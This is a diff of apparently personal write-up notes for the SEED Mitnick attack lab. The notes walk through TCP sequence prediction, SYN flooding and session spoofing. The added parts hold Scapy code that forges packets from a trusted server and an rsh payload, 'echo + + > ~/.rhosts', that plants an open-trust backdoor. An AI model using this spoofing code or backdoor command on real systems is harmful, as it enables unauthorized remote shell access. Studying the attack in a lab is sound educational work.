@@ -12,10 +12,10 @@
 
 - here are 4 primary steps in this attack
     1. *Sequence number prediction*: Mitnick needed to learn the pattern of the initial sequence number (ISN) on X-Terminal, in those days, ISNs were not random. Mitnick sent SYN requests to X-Terminal and received SYN+ACK responses, then he sent RST packet to X-Terminal, to clear the half-open connection from X-Terminal's queue. After repeating this for a number of times, he found there was a pattern between 2 successive TCP ISNs, this allowed Mitnick to predict ISNs
-    2. *SYN flooding attack on the trusted server*: To send a connection request from the trusted server to X-Terminal, Mitnick needed to send out a SYN packet from the trusted server to X-Terminal. X-Terminal would respond with a SYN+ACK packet, which was sent to the trusted server. Since the trusted server didn't actually initiate the request, it would send a RST packet to X-Terminal, asking X-Terminal to stop the 3-way handshake
-        - to solve this problem, Mitnick had to silence the trusted server. Therefore, before spoofing, Mitnick launched a SYN flooding attack on the server. Back then, OS were far more vulnerable to the SYN flooding attack. The attack could actually shut down the trusted computer, completely silencing it
+    2. *SYN flooding attack on the trusted server*: To send a connection request from the trusted server to X-Terminal, Mitnick needed to send out an SYN packet from the trusted server to X-Terminal. X-Terminal would respond with an SYN+ACK packet, which was sent to the trusted server. Since the trusted server didn't actually initiate the request, it would send a RST packet to X-Terminal, asking X-Terminal to stop the 3-way handshake
+        - to solve this problem, Mitnick had to silence the trusted server. Therefore, before spoofing, Mitnick launched an SYN flooding attack on the server. Back then, OS were far more vulnerable to the SYN flooding attack. The attack could actually shut down the trusted computer, completely silencing it
     3. *Spoofing a TCP connection*: Mitnick wanted to use `rsh` to run a backdoor command on X-Terminal, once the backdoor was setup, he could then log into X-Terminal. To run a remote shell on X-Terminal, Mitnick needed to pass the authentication, i.e., he needed to have a valid account on X-Terminal and know its password. The IP address of the trusted server had been added to the `.rhosts` file on X-Terminal, so when logging into X-Terminal from the trusted server, no password would be asked. Mitnick wanted to exploit this trusted relationship
-        - He needed to create a TCP connection between the trusted server and XT, and then run `rsh` inside this connection. He first sent a SYN request to XT, using the trusted server's IP as the source IP. XT then sent a SYN+ACK response to the server. Since the server had been shut down, it would not send RST to close the connection
+        - He needed to create a TCP connection between the trusted server and XT, and then run `rsh` inside this connection. He first sent an SYN request to XT, using the trusted server's IP as the source IP. XT then sent an SYN+ACK response to the server. Since the server had been shut down, it would not send RST to close the connection
         - To complete the 3-way handshake, Mitnick needed to spoof an ACK packet, which must acknowledge the sequence number in XT's SYN+ACK packet. Because of previous investigation, Mitnick was able to predict what this sequence number was, so he was able to successfully spoof the ACK response sent to XT to complete the TCP 3-way handshake
     4. *Running a remote shell*: Using the established TCP connection between the trusted server and XT, Mitnick could send a remote shell request to XT, asking it to run a command. Using this command, Mitnick wanted to create a backdoor on XT so that he could get a shell on XT anytime without repeating the attack
         - All he needed to do was to add `+ +` (plus, space, plus) to the `.rhosts` file on XT (this will allow machines with any IP addresses to run a remote shell on XT). He could achieve that by executing `echo + + > .rhosts`
@@ -51,7 +51,7 @@
 
 ## Task 1: Simulated SYN flooding
 - the OS at the time of Mitnick Attack were vulnerable to SYN flooding attacks, which could mute the target machine or even shut it down. However, SYN flooding can no longer cause such a damage for modern OSes
-- simulate this effect by manually stop the trusted server container, but that is not enough. When XT receives a SYN packet from the trusted server, it will respond with a SYN+ACK packet, before sending out this packet, it needs to know the MAC address of the trusted server, it will first check the ARP cache, if there is no entry for the trusted server, it will broadcast an ARP request asking for the MAC address. Since the trusted server has been muted, no one is going to answer the ARP request, hence X-Terminal cannot send out the response, and the TCP connection will not be established
+- simulate this effect by manually stop the trusted server container, but that is not enough. When XT receives an SYN packet from the trusted server, it will respond with an SYN+ACK packet, before sending out this packet, it needs to know the MAC address of the trusted server, it will first check the ARP cache, if there is no entry for the trusted server, it will broadcast an ARP request asking for the MAC address. Since the trusted server has been muted, no one is going to answer the ARP request, hence X-Terminal cannot send out the response, and the TCP connection will not be established
 - in the real attack, the trusted server's MAC address was actually in XT's ARP cache, even if it was not, before silencing the trusted server, we could simply spoof an ICMP echo request from the trusted server to XT, that would trigger XT to reply to the server, and hence would get the server's MAC and save it to its cache
 - to simplify the task, before stopping the trusted server, we will simply ping it from XT once, and use `arp -n` to check and ensure that the MAC address is in the cache, however, the OS may delete it if the OS fail to reach a destination using the cached MAC address. To simplify the attack, we can use `arp -s 10.9.0.6 02:42:0a:09:00:06` to add an entry to XT's ARP cache permanently
     ```
@@ -76,10 +76,48 @@
 
 ### Task 2.1: Spoof the First TCP Connection
 - The first TCP connection is initiated by the attacker via a spoofed SYN packet
-- *step 1*: spoof a SYN packet
+- *step 1*: spoof an SYN packet
+    ```
+    ip  = IP(src=TS_IP, dst=XT_IP)
+    tcp = TCP(flags="S", seq=ISN, sport=TS_PORT, dport=XT_PORT)
+    send(ip/tcp)
+    ```
 - *step 2*: respond to the SYN+ACK packet
+    ```
+    # Spoofing the ACK packet
+    SEQ = ISN + 1
+    ACK = pkt[TCP].seq + 1
+    ip  = IP(src=TS_IP, dst=XT_IP)
+    tcp = TCP(flags="A", seq=SEQ, ack=ACK, sport=TS_PORT, dport=XT_PORT)
+    send(ip/tcp)
+    print('[Connection 1] Spoofed ACK sent\n')
+    print('[Connection 1] Connection 1 established\n')
+    ```
 - *step 3*: spoof the `rsh` data packet
+    ```
+    ip  = IP(src=TS_IP, dst=XT_IP)
+    tcp = TCP(flags="A", seq=SEQ, ack=ACK, sport=TS_PORT, dport=XT_PORT)
+    data = '9090\x00seed\x00seed\x00echo + + > ~/.rhosts\x00'
+    rsh_data_len = len(data)
+    # The next sequence number via this connection is (SEQ + rsh_dat_len)
+    send(ip/tcp/data)
+    print('[Connection 1] Spoofed rsh data sent\n')
+    ```
+    - the format of `rsh` data is `[port]\x00[uid_client]\x00[uid_server]\x00[command]\x00`
 
 ### Task 2.2: Spoof the Second TCP Connection
+- XT will send an SYN, we need to spoof an SYN+ACK packet, and XT will send back an ACK packet to finish the 3-way handshake, we don't need to do anything to this ACK packet
+
+- After the second connection is established, XT will send an ACK with zero byte via the first connection, and XT will execute our command only if we respond an ACK, so we need to spoof an ACK, with the correct sequence number. Although we are not allowed to use the ACK number of sniffed packets, we can calculate the next sequence number, remember that the last spoofed packet is the `rsh` data packet, and it's sequence number is `ISN+1`, and we know the data length, so the next sequence number is `ISN+1+rsh_data_len`
 
 ## Task 3: Set Up a Backdoor
+- `rsh` data: `9090\x00seed\x00seed\x00echo + + > ~/.rhosts\x00`
+- I put the entire attack process into one Python file `mitnick_auto.py`, such that by running it, the attack will be launched automatically
+- result (on the attacker container)
+    ```
+    # ./mitnick_auto.py
+    ... <---- some information printed out
+    # su seed
+    $ rsh 10.9.0.5 date <---- test the backdoor
+    Sun Feb 11 07:53:46 UTC 2024 <---- successfully run command on XT
+    ```
